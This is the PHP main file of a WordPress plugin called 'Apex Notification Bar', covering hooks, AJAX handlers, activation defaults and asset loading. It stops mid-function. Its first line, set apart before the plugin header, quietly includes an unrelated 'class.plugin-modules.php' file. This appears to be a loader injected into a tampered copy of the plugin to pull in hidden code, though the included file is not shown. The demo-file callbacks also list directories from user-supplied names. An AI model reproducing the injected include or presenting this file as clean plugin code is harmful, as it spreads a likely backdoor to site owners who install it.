<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php defined( 'ABSPATH' ) or die( 'No script kiddies please!' );
/*
Plugin Name: Apex Notification Bar
Plugin URI:  https://accesspressthemes.com/wordpress-plugins/apex-notification-bar/
Description: An advanced notification bar plugin used to display multiple notification bar on same page with different position on your site page wise.
Version:     2.1.0
Author:      AccessPress Themes
Author URI:  http://accesspressthemes.com
License:     GPL2
Domain Path: /languages/
Text Domain: apexnb-pro
*/

/**
 * Declaration of necessary constants for Plugin
 * */
defined( 'APEXNB_IMAGE_DIR' ) or define('APEXNB_IMAGE_DIR', plugin_dir_url(__FILE__) .'images');
defined( 'APEXNB_ICONS_DIR' ) or define('APEXNB_ICONS_DIR', plugin_dir_url(__FILE__).'images/icon-sets');
defined( 'APEXNB_JS_DIR' ) or define('APEXNB_JS_DIR', plugin_dir_url(__FILE__) . 'js');
defined( 'APEXNB_CSS_DIR' ) or define('APEXNB_CSS_DIR', plugin_dir_url(__FILE__) . 'css');
defined( 'APEXNB_CLASS_DIR' ) or define('APEXNB_CLASS_DIR',dirname(__FILE__) . '/class');
defined( 'APEXNB_CLASS_DIR_PAGINATION' ) or define('APEXNB_CLASS_DIR_PAGINATION',plugin_dir_url(__FILE__). 'inc/backend/main_setup/');
defined( 'APEXNB_PLUGIN_FILE' ) or define('APEXNB_PLUGIN_FILE', __FILE__);
defined( 'APEXNB_VERSION' ) or define('APEXNB_VERSION', '2.1.0');
defined( 'APEXNB_TITLE' ) or define('APEXNB_TITLE', 'APEX NOTIFICATION BAR');
defined( 'APEXNB_TD' ) or define('APEXNB_TD', 'apexnb-pro');
defined( 'APEXNB_BXSLIDER_VERSION' ) or define('APEXNB_BXSLIDER_VERSION', '4.1.2');
defined( 'APEXNB_TICKER_MARQUE_VERSION' ) or define('APEXNB_TICKER_MARQUE_VERSION', '2.0.0');
defined( 'APEXNB_PAGE_LIMIT' ) or define('APEXNB_PAGE_LIMIT', '50');

defined( 'APEXNB_PRO_PATH' ) or define( 'APEXNB_PRO_PATH', plugin_dir_path( __FILE__ ) );
defined( 'APEXNB_BACKEND_PATH' ) or define('APEXNB_BACKEND_PATH',plugin_dir_url(__FILE__). 'inc/backend/');
defined( 'APEXNB_PRO_URL' ) or define( 'APEXNB_PRO_URL', plugin_dir_url( __FILE__ ) ); //plugin directory url
include(APEXNB_CLASS_DIR.'/class-autoload.php');
include(APEXNB_CLASS_DIR.'/edn_pagination.php');
include(APEXNB_CLASS_DIR.'/class.phpmailer.php');

if (!class_exists('APEXNB_Class')) {

    class APEXNB_Class {
        var $apexnb_settings;
        var $apexnb_constant_settings;
        /**
         * Initializes the plugin functions 
         */
        function __construct() {
            $this->apexnb_settings = get_option('apexnb_settings');
            $this->apexnb_constant_settings = get_option('apexnb_constant_settings');
            $this->mailchimp = new APEXNB_MailChimp();
            register_activation_hook( __FILE__, array($this,'edn_pro_activation' ));// Loads activating the EDN plugin
            add_action( 'plugins_loaded', array($this, 'edn_plugin_load_textdomain') ); //add Load plugin textdomain.
            add_action('admin_menu', array($this, 'edn_pro_menu')); //Register The Plugin Menu
            add_action('admin_enqueue_scripts',array($this,'edn_pro_admin_scripts')); //Registration of admin assets
            add_action('admin_head', array($this,'apexnb_date_time_js'));
            add_action('init', array($this, 'admin_session_init')); //intializes session 

            add_action('admin_post_edn_pro_add_bar_action',array($this,'edn_pro_add_bar_action')); //recieves the posted values from add bar form
            add_action('admin_post_edn_edit_action', array($this, 'edn_edit_action')); //notificaion bar edit action 
            add_action('admin_post_edn_copy_action', array($this, 'edn_copy_action')); //notificaion bar coppy action 
            add_action('admin_post_edn_delete_action', array($this, 'edn_delete_action')); //notificaion bar delete action
            add_action('admin_post_edn_pro_settings_action',array($this,'edn_pro_settings_action')); //recieves the posted values from settings form
            add_action('admin_post_edn_pro_restore_default', array($this, 'edn_pro_restore_default')); //restores default settings;
            add_action('wp_enqueue_scripts', array($this,'edn_pro_front_scripts' ), 99); //Registration of Frontend assets
            
            /**
            * Icon List Ajax
            */

            add_action('wp_ajax_edn_pro_icon_list_action', array($this, 'edn_pro_icon_list_action')); //admin ajax action for icon listing 
            add_action('wp_ajax_nopriv_edn_pro_icon_list_action', array($this, 'no_permission')); //action for unauthenticate admin ajax call

            /**
            * Mail chimp Ajax
            */
            add_action('wp_ajax_ajax_mailchimp', array($this, 'ajax_mailchimp_callback')); //admin ajax action for icon listing 
            add_action('wp_ajax_nopriv_ajax_mailchimp', array($this, 'no_permission')); //action for unauthenticate admin ajax call

              /**
            * Mail chimp Ajax
            */
            add_action('wp_ajax_ajax_reset_showonce_backend', array($this, 'fn_ajax_reset_showonce_backend')); //admin ajax action for icon listing 
            add_action('wp_ajax_nopriv_ajax_reset_showonce_backend', array($this, 'no_permission')); //action for unauthenticate admin ajax call

            /**
             * Display Title Ajax
            */
            add_action('wp_ajax_ajax_display_title', array($this, 'ajax_display_title_callback')); //admin ajax action for icon listing 
            add_action('wp_ajax_nopriv_ajax_display_title', array($this, 'no_permission')); //action for unauthenticate admin ajax call
            
            /* add meta box for pages and posts */
            add_action( 'add_meta_boxes', array($this, 'edn_bar_custom_meta_boxes')); // add notifiaction bar option in post, page and post type.
            add_action('save_post', array($this, 'edn_bar_save_meta_box_data')); // save meta box data.
            /* add meta box for pages and posts end*/

            add_action('wp_footer', array($this, 'edn_notify_call_in_frontend')); //Register The redirect function to frontend
            add_action( 'wp_ajax_contact_us_ajax', array($this,'contact_us_action_callback' )); // Registration of contact us ajax
            add_action( 'wp_ajax_nopriv_contact_us_ajax', array($this,'contact_us_action_callback' )); // Registration of contact us ajax
            add_action( 'wp_ajax_subscribe_ajax', array($this,'subscribe_action_callback' )); // Registration of subscribe ajax
            add_action( 'wp_ajax_nopriv_subscribe_ajax', array($this,'subscribe_action_callback' )); // Registration of subscribe ajax
             add_action('template_redirect',array($this,'confirm_notification_subscribe')); // Registration of notification subscribe confirm
            add_action( 'wp_ajax_mailchimp_ajax', array($this,'mailchimp_action_callback' )); // Registration of mailchimp ajax
            add_action( 'wp_ajax_nopriv_mailchimp_ajax', array($this,'mailchimp_action_callback' )); // Registration of mailchimp ajax
            /* constant contact form settings */

            add_action('admin_post_edn_pro_constant_contactsettings_action',array($this,'edn_pro_constant_contactsettings_action')); //recieves the posted values from settings form

            /**
            * constant contact frontend Ajax
            */
             add_action('wp_ajax_constant_contact_ajax', array($this, 'submit_constant_contact')); //admin ajax action for icon listing 
             add_action('wp_ajax_nopriv_constant_contact_ajax', array($this, 'submit_constant_contact')); //action for unauthenticate admin ajax call

             /* add open panel with 3 columns widgets display*/
            add_action( 'wp_ajax_add_selected_widget', array( $this, 'add_selected_widget' ) ); //add selected widgets on div section using ajax
            add_action( 'wp_ajax_edit_widget_data', array( $this, 'ajax_edit_widget_data' ) ); //edit widget data of specific widgets 
            add_action( 'wp_ajax_ednpro_delete_widget', array( $this, 'ajax_delete_widget_form' ) ); //edit widget data of specific widgets 
            add_action( 'wp_ajax_ednpro_save_widget', array( $this, 'ajax_save_widget' ) ); //save widgets data
            add_action( 'init', array( $this, 'register_sidebar' ) ); 
            add_action( 'after_widget_add', array( $this, 'clear_caches' ) );
            add_action( 'after_widget_save', array( $this, 'clear_caches' ) );
            add_action( 'after_widget_delete', array( $this, 'clear_caches' ) );

             /**
            * Reset Show only once button For all Bar Ajax
            */
            add_action('wp_ajax_ajax_reset_showonce', array($this, 'fn_ajax_reset_showonce')); //admin ajax action for icon listing 
            add_action('wp_ajax_nopriv_ajax_reset_showonce', array($this, 'no_permission')); //action for unauthenticate admin ajax call
            
            /**
            * Ajax Call for demo file
            */
            add_action('wp_ajax_get_demo_files', array($this, 'get_demo_files_callback')); //admin ajax action for icon listing 
            add_action('wp_ajax_nopriv_get_demo_files', array($this, 'no_permission')); //action for unauthenticate admin ajax call

              add_action('wp_ajax_get_demo_filess', array($this, 'get_demo_filess_callback')); //admin ajax action for icon listing 
            add_action('wp_ajax_nopriv_get_demo_filess', array($this, 'no_permission')); //action for unauthenticate admin ajax call
        }

        public function get_demo_files_callback(){
             if(isset($_POST) && wp_verify_nonce($_POST['nonce'],'edn-admin-ajax-nonce')){
                $first_choice = sanitize_text_field($_POST['first_choice']);
                if($first_choice != ''){
                    $dir    = APEXNB_PRO_PATH.'/demo/'.$first_choice;
                    $files = scandir($dir, 1);
                    echo json_encode($files);
                    die();
                }

            }
        }

        public function get_demo_filess_callback(){
             if(isset($_POST) && wp_verify_nonce($_POST['nonce'],'edn-admin-ajax-nonce')){
                $first_choice = sanitize_text_field($_POST['first_choice']);
                $second_choice = sanitize_text_field($_POST['second_choice']);
                if($first_choice != '' &&  $second_choice  != ''){
                    $dir    = APEXNB_PRO_PATH.'/demo/'.$first_choice.'/'.$second_choice;
                    $files = scandir($dir, 1);
                    echo json_encode($files);
                    die();
                }

            }
        }

      /**
      * Clear the cache 
      * @since 1.0
      */
      public function clear_caches() {

        // https://wordpress.org/plugins/widget-output-cache/
        if ( function_exists( 'menu_output_cache_bump' ) ) {
            menu_output_cache_bump();
        }

        // https://wordpress.org/plugins/widget-output-cache/
        if ( function_exists( 'widget_output_cache_bump' ) ) {
            widget_output_cache_bump();
        }

    }

          /**
         * Get all Posts Data for Ajax Pagination
         **/
        // function edn_get_postsdata(){
        //        $postsPerPage = APEXNB_PAGE_LIMIT;
        //        $page = isset( $_POST['page'] ) ? abs( (int) $_POST['page'] ) : 0;
        //        $args = array(
        //                 'post_type'      => array( 'page' ,'post' ),
        //                 'post_status'    => array( 'publish' ),
        //                 'orderby'        => 'id',
        //                 'order'          => 'desc',
        //                 'offset'         =>  $page,
        //                 'posts_per_page' =>  $postsPerPage
        //         );

        //          $query = new WP_Query( $args );

        //         return $query;
        // }
        /**
         * Get all Posts Data for Ajax Pagination
         **/
        function edn_get_postsdata(){
         $postsPerPage = APEXNB_PAGE_LIMIT;
         $page = isset( $_POST['page'] ) ? abs( (int) $_POST['page'] ) : 0;
         $args = array(
            'post_type'      => array( 'post', 'page' , 'post_type'),
            'post_status'    => array( 'publish' ),
            'orderby'        => 'id',
            'order'          => 'desc',
            'offset'         =>  $page,
            'posts_per_page' =>  $postsPerPage
            );

         $query = new WP_Query( $args );

         return $query;
     }

     function edn_get_postsdata_by_category($category_slug){
         $postsPerPage = APEXNB_PAGE_LIMIT;
         $page = isset( $_POST['page'] ) ? abs( (int) $_POST['page'] ) : 0;
         $args = array(
            'post_type'      => array( 'post', 'page' , 'post_type'),
            'post_status'    => array( 'publish' ),
            'orderby'        => 'id',
            'order'          => 'desc',
            'offset'         =>  $page,
            'posts_per_page' =>  $postsPerPage,
            'category_name'  =>  $category_slug
            );
         $query = new WP_Query( $args );

         return $query;
     }

        /**
         * activating the EDN Pro plugin
         **/
        function edn_pro_activation(){
         include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
         if (is_plugin_active('apex-notification-bar-lite/apex-notification-bar-lite.php')) {
           wp_die( __( 'You need to deactivate Apex Notification Bar Lite Free Plugin in order to 
              activate Apex Notification Bar Premium plugin. Please deactivate free one first. Your data will not be affected on deactivating.', APEXNB_TD ) );
       }

       include(APEXNB_PRO_PATH.'inc/backend/activation.php');

            /**
             * Load Default Settings
             * */
            if (!get_option('apexnb_settings')) {
                $apexnb_settings = $this->get_default_settings();
                update_option('apexnb_settings', $apexnb_settings);
            }

            if (!get_option('apexnb_constant_settings')) {
                $apexnb_constant_settings = $this->get_default_constant_settings();
                update_option('apexnb_constant_settings', $apexnb_constant_settings);
            }

            /**
             * Google font save
             * */
            $family = array('ABeeZee','Abel','Abril Fatface','Aclonica','Acme','Actor','Adamina','Advent Pro','Aguafina Script','Akronim','Aladin','Aldrich','Alef','Alegreya','Alegreya SC','Alegreya Sans','Alegreya Sans SC','Alex Brush','Alfa Slab One','Alice','Alike','Alike Angular','Allan','Allerta','Allerta Stencil','Allura','Almendra','Almendra Display','Almendra SC','Amarante','Amaranth','Amatic SC','Amethysta','Amiri','Amita','Anaheim','Andada','Andika','Angkor','Annie Use Your Telescope','Anonymous Pro','Antic','Antic Didone','Antic Slab','Anton','Arapey','Arbutus','Arbutus Slab','Architects Daughter','Archivo Black','Archivo Narrow','Arimo','Arizonia','Armata','Artifika','Arvo','Arya','Asap','Asar','Asset','Astloch','Asul','Atomic Age','Aubrey','Audiowide','Autour One','Average','Average Sans','Averia Gruesa Libre','Averia Libre','Averia Sans Libre','Averia Serif Libre','Bad Script','Balthazar','Bangers','Basic','Battambang','Baumans','Bayon','Belgrano','Belleza','BenchNine','Bentham','Berkshire Swash','Bevan','Bigelow Rules','Bigshot One','Bilbo','Bilbo Swash Caps','Biryani','Bitter','Black Ops One','Bokor','Bonbon','Boogaloo','Bowlby One','Bowlby One SC','Brawler','Bree Serif','Bubblegum Sans','Bubbler One','Buda','Buenard','Butcherman','Butterfly Kids','Cabin','Cabin Condensed','Cabin Sketch','Caesar Dressing','Cagliostro','Calligraffitti','Cambay','Cambo','Candal','Cantarell','Cantata One','Cantora One','Capriola','Cardo','Carme','Carrois Gothic','Carrois Gothic SC','Carter One','Caudex','Cedarville Cursive','Ceviche One','Changa One','Chango','Chau Philomene One','Chela One','Chelsea Market','Chenla','Cherry Cream Soda','Cherry Swash','Chewy','Chicle','Chivo','Cinzel','Cinzel Decorative','Clicker Script','Coda','Coda Caption','Codystar','Combo','Comfortaa','Coming Soon','Concert One','Condiment','Content','Contrail One','Convergence','Cookie','Copse','Corben','Courgette','Cousine','Coustard','Covered By Your Grace','Crafty Girls','Creepster','Crete Round','Crimson Text','Croissant One','Crushed','Cuprum','Cutive','Cutive Mono','Damion','Dancing Script','Dangrek','Dawning of a New Day','Days One','Dekko','Delius','Delius Swash Caps','Delius Unicase','Della Respira','Denk One','Devonshire','Dhurjati','Didact Gothic','Diplomata','Diplomata SC','Domine','Donegal One','Doppio One','Dorsa','Dosis','Dr Sugiyama','Droid Sans','Droid Sans Mono','Droid Serif','Duru Sans','Dynalight','EB Garamond','Eagle Lake','Eater','Economica','Eczar','Ek Mukta','Electrolize','Elsie','Elsie Swash Caps','Emblema One','Emilys Candy','Engagement','Englebert','Enriqueta','Erica One','Esteban','Euphoria Script','Ewert','Exo','Exo 2','Expletus Sans','Fanwood Text','Fascinate','Fascinate Inline','Faster One','Fasthand','Fauna One','Federant','Federo','Felipa','Fenix','Finger Paint','Fira Mono','Fira Sans','Fjalla One','Fjord One','Flamenco','Flavors','Fondamento','Fontdiner Swanky','Forum','Francois One','Freckle Face','Fredericka the Great','Fredoka One','Freehand','Fresca','Frijole','Fruktur','Fugaz One','GFS Didot','GFS Neohellenic','Gabriela','Gafata','Galdeano','Galindo','Gentium Basic','Gentium Book Basic','Geo','Geostar','Geostar Fill','Germania One','Gidugu','Gilda Display','Give You Glory','Glass Antiqua','Glegoo','Gloria Hallelujah','Goblin One','Gochi Hand','Gorditas','Goudy Bookletter 1911','Graduate','Grand Hotel','Gravitas One','Great Vibes','Griffy','Gruppo','Gudea','Gurajada','Habibi','Halant','Hammersmith One','Hanalei','Hanalei Fill','Handlee','Hanuman','Happy Monkey','Headland One','Henny Penny','Herr Von Muellerhoff','Hind','Holtwood One SC','Homemade Apple','Homenaje','IM Fell DW Pica','IM Fell DW Pica SC','IM Fell Double Pica','IM Fell Double Pica SC','IM Fell English','IM Fell English SC','IM Fell French Canon','IM Fell French Canon SC','IM Fell Great Primer','IM Fell Great Primer SC','Iceberg','Iceland','Imprima','Inconsolata','Inder','Indie Flower','Inika','Inknut Antiqua','Irish Grover','Istok Web','Italiana','Italianno','Jacques Francois','Jacques Francois Shadow','Jaldi','Jim Nightshade','Jockey One','Jolly Lodger','Josefin Sans','Josefin Slab','Joti One','Judson','Julee','Julius Sans One','Junge','Jura','Just Another Hand','Just Me Again Down Here','Kadwa','Kalam','Kameron','Kantumruy','Karla','Karma','Kaushan Script','Kavoon','Kdam Thmor','Keania One','Kelly Slab','Kenia','Khand','Khmer','Khula','Kite One','Knewave','Kotta One','Koulen','Kranky','Kreon','Kristi','Krona One','Kurale','La Belle Aurore','Laila','Lakki Reddy','Lancelot','Lateef','Lato','League Script','Leckerli One','Ledger','Lekton','Lemon','Libre Baskerville','Life Savers','Lilita One','Lily Script One','Limelight','Linden Hill','Lobster','Lobster Two','Londrina Outline','Londrina Shadow','Londrina Sketch','Londrina Solid','Lora','Love Ya Like A Sister','Loved by the King','Lovers Quarrel','Luckiest Guy','Lusitana','Lustria','Macondo','Macondo Swash Caps','Magra','Maiden Orange','Mako','Mallanna','Mandali','Marcellus','Marcellus SC','Marck Script','Margarine','Marko One','Marmelad','Martel','Martel Sans','Marvel','Mate','Mate SC','Maven Pro','McLaren','Meddon','MedievalSharp','Medula One','Megrim','Meie Script','Merienda','Merienda One','Merriweather','Merriweather Sans','Metal','Metal Mania','Metamorphous','Metrophobic','Michroma','Milonga','Miltonian','Miltonian Tattoo','Miniver','Miss Fajardose','Modak','Modern Antiqua','Molengo','Molle','Monda','Monofett','Monoton','Monsieur La Doulaise','Montaga','Montez','Montserrat','Montserrat Alternates','Montserrat Subrayada','Moul','Moulpali','Mountains of Christmas','Mouse Memoirs','Mr Bedfort','Mr Dafoe','Mr De Haviland','Mrs Saint Delafield','Mrs Sheppards','Muli','Mystery Quest','NTR','Neucha','Neuton','New Rocker','News Cycle','Niconne','Nixie One','Nobile','Nokora','Norican','Nosifer','Nothing You Could Do','Noticia Text','Noto Sans','Noto Serif','Nova Cut','Nova Flat','Nova Mono','Nova Oval','Nova Round','Nova Script','Nova Slim','Nova Square','Numans','Nunito','Odor Mean Chey','Offside','Old Standard TT','Oldenburg','Oleo Script','Oleo Script Swash Caps','Open Sans','Open Sans Condensed','Oranienbaum','Orbitron','Oregano','Orienta','Original Surfer','Oswald','Over the Rainbow','Overlock','Overlock SC','Ovo','Oxygen','Oxygen Mono','PT Mono','PT Sans','PT Sans Caption','PT Sans Narrow','PT Serif','PT Serif Caption','Pacifico','Palanquin','Palanquin Dark','Paprika','Parisienne','Passero One','Passion One','Pathway Gothic One','Patrick Hand','Patrick Hand SC','Patua One','Paytone One','Peddana','Peralta','Permanent Marker','Petit Formal Script','Petrona','Philosopher','Piedra','Pinyon Script','Pirata One','Plaster','Play','Playball','Playfair Display','Playfair Display SC','Podkova','Poiret One','Poller One','Poly','Pompiere','Pontano Sans','Poppins','Port Lligat Sans','Port Lligat Slab','Pragati Narrow','Prata','Preahvihear','Press Start 2P','Princess Sofia','Prociono','Prosto One','Puritan','Purple Purse','Quando','Quantico','Quattrocento','Quattrocento Sans','Questrial','Quicksand','Quintessential','Qwigley','Racing Sans One','Radley','Rajdhani','Raleway','Raleway Dots','Ramabhadra','Ramaraja','Rambla','Rammetto One','Ranchers','Rancho','Ranga','Rationale','Ravi Prakash','Redressed','Reenie Beanie','Revalia','Rhodium Libre','Ribeye','Ribeye Marrow','Righteous','Risque','Roboto','Roboto Condensed','Roboto Mono','Roboto Slab','Rochester','Rock Salt','Rokkitt','Romanesco','Ropa Sans','Rosario','Rosarivo','Rouge Script','Rozha One','Rubik','Rubik Mono One','Rubik One','Ruda','Rufina','Ruge Boogie','Ruluko','Rum Raisin','Ruslan Display','Russo One','Ruthie','Rye','Sacramento','Sahitya','Sail','Salsa','Sanchez','Sancreek','Sansita One','Sarala','Sarina','Sarpanch','Satisfy','Scada','Scheherazade','Schoolbell','Seaweed Script','Sevillana','Seymour One','Shadows Into Light','Shadows Into Light Two','Shanti','Share','Share Tech','Share Tech Mono','Shojumaru','Short Stack','Siemreap','Sigmar One','Signika','Signika Negative','Simonetta','Sintony','Sirin Stencil','Six Caps','Skranji','Slabo 13px','Slabo 27px','Slackey','Smokum','Smythe','Sniglet','Snippet','Snowburst One','Sofadi One','Sofia','Sonsie One','Sorts Mill Goudy','Source Code Pro','Source Sans Pro','Source Serif Pro','Special Elite','Spicy Rice','Spinnaker','Spirax','Squada One','Sree Krushnadevaraya','Stalemate','Stalinist One','Stardos Stencil','Stint Ultra Condensed','Stint Ultra Expanded','Stoke','Strait','Sue Ellen Francisco','Sumana','Sunshiney','Supermercado One','Sura','Suranna','Suravaram','Suwannaphum','Swanky and Moo Moo','Syncopate','Tangerine','Taprom','Tauri','Teko','Telex','Tenali Ramakrishna','Tenor Sans','Text Me One','The Girl Next Door','Tienne','Tillana','Timmana','Tinos','Titan One','Titillium Web','Trade Winds','Trocchi','Trochut','Trykker','Tulpen One','Ubuntu','Ubuntu Condensed','Ubuntu Mono','Ultra','Uncial Antiqua','Underdog','Unica One','UnifrakturCook','UnifrakturMaguntia','Unkempt','Unlock','Unna','VT323','Vampiro One','Varela','Varela Round','Vast Shadow','Vesper Libre','Vibur','Vidaloka','Viga','Voces','Volkhov','Vollkorn','Voltaire','Waiting for the Sunrise','Wallpoet','Walter Turncoat','Warnes','Wellfleet','Wendy One','Wire One','Work Sans','Yanone Kaffeesatz','Yantramanav','Yellowtail','Yeseva One','Yesteryear','Zeyada');
            $apexnb_fonts = get_option('apexnb_fonts');
            if (empty($apexnb_fonts)) {
                update_option('apexnb_fonts', $family);
            }
            
        }

         /*
         *  Constant Contact Default Account api value
         * Returns Default Settings
         */
         function get_default_constant_settings() {
            $apexnb_constant_settings = array(
                'edn_cc_username'=>'',
                'edn_cc_pwd'=>'',
                'edn_cc_apikey'=>'',
                'edn_cc_accesstoken'=>''
                );
            return $apexnb_constant_settings;
        }

        /**
         * Load plugin textdomain.
         *
         * @since 1.0.0
         */
        function edn_plugin_load_textdomain() {
          load_plugin_textdomain( APEXNB_TD, false, dirname( plugin_basename( __FILE__ ) ) . '/languages' ); 
      }

      public function apexnb_date_time_js(){
          $plugin_pages = array( APEXNB_TD, 'apexnb-add-bar', 'apexnb-custom-code', 'apexnb-mailchimp-settings','apexnb-settings', 'apexnb-how-to-use','apexnb-constant_contact','apexnb-about','apexnb-opt-subscribers-list');
          if ( isset( $_GET['page'] ) && in_array( $_GET['page'], $plugin_pages ) ) {
            wp_register_style('apexnb_timepicker_style' , APEXNB_CSS_DIR. '/backend/jquery-ui-timepicker-addon.css');
            wp_enqueue_style('apexnb_timepicker_style');   
            wp_enqueue_script('apexnb-time-picker-jquery',  APEXNB_JS_DIR. '/backend/jquery-ui-timepicker-addon.js',  array('jquery' )); 
         }   
    }

        /**
         * Registration of admin assets 
         * */
        function edn_pro_admin_scripts(){
            $plugin_pages = array( APEXNB_TD, 'apexnb-add-bar', 'apexnb-custom-code', 'apexnb-mailchimp-settings','apexnb-settings', 'apexnb-how-to-use','apexnb-constant_contact','apexnb-about','apexnb-opt-subscribers-list');

            if ( isset( $_GET['page'] ) && in_array( $_GET['page'], $plugin_pages ) ) {

                $edn_pro_script_variable = array('icon_preview' => __('Icon Preview', APEXNB_TD),
                    'icon_link' => __('Icon Link', APEXNB_TD),
                    'icon_link_target' => __('Icon Link Target',APEXNB_TD),
                    'icon_delete_confirm' => __('Are you sure you want to delete this icon from this list?', APEXNB_TD),
                    'ajax_url' => admin_url() . 'admin-ajax.php',
                    'ajax_nonce' => wp_create_nonce('edn-ajax-nonce'),
                    'selected_widget_limits' => __('Limit Upto 3 to add widgets.', APEXNB_TD),
                    'saving_msg' => __('Saving Data.',APEXNB_TD),
                    'saved_msg' => __('Saved Data.',APEXNB_TD),
                    'bar_warning' => __('Are you sure you want to discard the design added previously?', APEXNB_TD),
                    'icon_collapse' => __('Collapse All', APEXNB_TD),
                    'icon_expand' => __('Expand All', APEXNB_TD),
                    'notification_bar_message' => __('Notification Message',APEXNB_TD),
                    'link_but_text_label' => __('Link Button Text',APEXNB_TD),
                    'link_but_url_label' => __('Link Button URL',APEXNB_TD),
                    'link_but_target' => __('Link Target',APEXNB_TD),
                    'link_but_color_label' => __('Link Button Color',APEXNB_TD),
                    'link_but_font_color_label' => __('Link Button Font Color',APEXNB_TD),
                    'name_label' => __('Name Label',APEXNB_TD),
                    'email_label' => __('Email Label',APEXNB_TD),
                    'name_required_label' => __('Name Required',APEXNB_TD),
                    'email_required_label' => __('Email Required',APEXNB_TD),
                    'msg_required_label' => __('Message Required',APEXNB_TD),
                    'message_label' => __('Message Label',APEXNB_TD),
                    'send_to_email_label' => __('Send To Email',APEXNB_TD),
                    'name_placeholder_label' => __('Name Placeholder',APEXNB_TD),
                    'email_placeholder_label' => __('Email Placeholder',APEXNB_TD),
                    'message_placeholder_label' => __('Message Placeholder',APEXNB_TD),
                    'name_error_message_label' => __('Name Error Message',APEXNB_TD),
                    'email_error_message_label' => __('Email Error Message',APEXNB_TD),
                    'msg_error_label' => __('Message Error Message',APEXNB_TD),
                    'validemail_error_message_label' => __('Valid Email Error Message',APEXNB_TD),
                    'success_message' => __('Success Message',APEXNB_TD),
                    'send_fail_message' => __('Fail Email Message',APEXNB_TD),
                    'contact_form7_label' => __('Contact Form 7 Shortcode',APEXNB_TD),
                    'shortcode_popup_text' => __('Popup Button Text',APEXNB_TD),
                    'custom_shortcode' => __('Shortcode',APEXNB_TD),
                    'ajaxurl' => admin_url() . 'admin-ajax.php',
                    'ajaxnonce' => wp_create_nonce('edn-admin-ajax-nonce'));

                wp_enqueue_style('apexnb-mCustomScrollbar',APEXNB_CSS_DIR.'/frontend/jquery.mCustomScrollbar.css');
                wp_enqueue_script('apexnb-mCustomScrollbarjs',APEXNB_JS_DIR.'/frontend/jquery.mCustomScrollbar.concat.min.js',array('jquery'),APEXNB_VERSION);
                /**
                 * Backend CSS
                 * */
                wp_enqueue_style('apexnb-admin-style', APEXNB_CSS_DIR . '/backend/backend.css', array(), APEXNB_VERSION);
                wp_enqueue_style('apexnb-codemirror-css', APEXNB_CSS_DIR . '/backend/syntax/codemirror.css', '', APEXNB_VERSION );
                wp_enqueue_style('apexnb-fontawesome-css', APEXNB_CSS_DIR . '/font-awesome/font-awesome.min.css',false,APEXNB_VERSION);
                wp_enqueue_style('thickbox'); //for including wp thickbox css
                
                wp_enqueue_style('apexnb-jquery-ui-style', APEXNB_CSS_DIR . '/backend/jquery-ui.css', array(), '1.11.4');
                wp_enqueue_style('apexnb-google-fonts-style', add_query_arg($this->edn_pro_font_re_form(), "//fonts.googleapis.com/css"));
                /**
                 * Backend JS
                 * */
                wp_enqueue_script('apexnb-notification-bar-pro-webfont', '//ajax.googleapis.com/ajax/libs/webfont/1.4.7/webfont.js');
                wp_enqueue_script( 'apexnb-codemirror-js', APEXNB_JS_DIR . '/backend/syntax/codemirror.js', array('jquery'), APEXNB_VERSION );
                wp_enqueue_script( 'apexnb-codemirror-css-js', APEXNB_JS_DIR . '/backend/syntax/css.js', array('jquery', 'apexnb-codemirror-js'), APEXNB_VERSION );

                wp_enqueue_script('jquery-ui-sortable');
                // wp_enqueue_script('jquery-ui-slider');
                wp_enqueue_script('jquery-ui-core');
                wp_enqueue_media();

                wp_enqueue_script('media-upload'); //for uploading image using wp native uploader
                wp_enqueue_script('thickbox'); //for uploading image using wp native uploader + thickbox 
                wp_enqueue_style('wp-color-picker'); //for including color picker css
                wp_enqueue_script( 'apexnb-color-alpha', APEXNB_JS_DIR . '/backend/wp-color-picker-alpha.js',array('wp-color-picker') ,false, APEXNB_VERSION );
                wp_enqueue_script('apexnb-admin-script',APEXNB_JS_DIR.'/backend/backend.js',array('jquery', 'jquery-ui-sortable','jquery-ui-core','wp-color-picker'),APEXNB_VERSION);
                wp_localize_script('apexnb-admin-script', 'edn_pro_script_variable', $edn_pro_script_variable); //localization of php variable in edn-pro-admin-js
                wp_enqueue_script('apexnb-jquery-ui-script',APEXNB_JS_DIR.'/backend/jquery-ui.js',array('jquery'),'1.11.4');  

                wp_enqueue_style( 'apexnb-custom-select-css', APEXNB_CSS_DIR . '/backend/jquery.selectbox.css', array(), APEXNB_VERSION );
                wp_enqueue_script( 'apexnb-custom-select-js', APEXNB_JS_DIR . '/backend/jquery.selectbox-0.2.min.js', array( 'jquery' ), APEXNB_VERSION );

                if( is_plugin_active( "wp-editor/wpeditor.php" ) && $_SERVER['QUERY_STRING'] == 'page=apexnb-add-bar' && $_SERVER['QUERY_STRING'] == 'page=apexnb' ) {
                    function remove_wpeditor_header_info() {
                        wp_deregister_style( 'codemirror' );
                        wp_deregister_style( 'codemirror_dialog' );
                        wp_deregister_style( 'codemirror_themes' );
                        wp_deregister_script( 'codemirror' );
                        wp_deregister_script( 'codemirror_php' );
                        wp_deregister_script( 'codemirror_javascript' );
                        wp_deregister_script( 'codemirror_css' );
                        wp_deregister_script( 'codemirror_xml' );
                        wp_deregister_script( 'codemirror_clike' );
                        wp_deregister_script( 'codemirror_dialog' );
                        wp_deregister_script( 'codemirror_search' );
                        wp_deregister_script( 'codemirror_searchcursor' );
                        wp_deregister_script( 'codemirror_mustache' );
                    }
                    add_action( 'admin_init', 'remove_wpeditor_header_info', 20 );
                    global $wp_version;
                    if($wp_version >= "4.8"){
                      wp_enqueue_editor();
                  }
              }
          }
      }




        /**
         * Registration of Frontend assets 
         * */
        function edn_pro_front_scripts() {
           $edn_bar_data = $this->get_specific_bar();
             // Subscribe Custom Form
           $success = __('Thank you for subscribing us.',APEXNB_TD);
           $but_email_error_message = __('Please enter a valid email address.',APEXNB_TD);
           $but_check_to_conform = __('Please check your mail to confirm.',APEXNB_TD);
           $but_already_subs = __('You have already subscribed.',APEXNB_TD);
           $but_sending_fail = __('Confirmation sending fail.',APEXNB_TD);
            //mailchimp
           $thank_txt = __('Thank you for subscribing.',APEXNB_TD);               
           $mailchimp_email_error_msg = __('Please enter a valid email address.',APEXNB_TD);               
           $mailchimp_check_to_conform = __('Please check your mail to confirm.',APEXNB_TD);         
           $mailchimp_sending_fail = __('Confirmation sending fail.',APEXNB_TD);               
           if($this->is_woocommerce_activated()){
            $wooenabled = "true";
        }else{
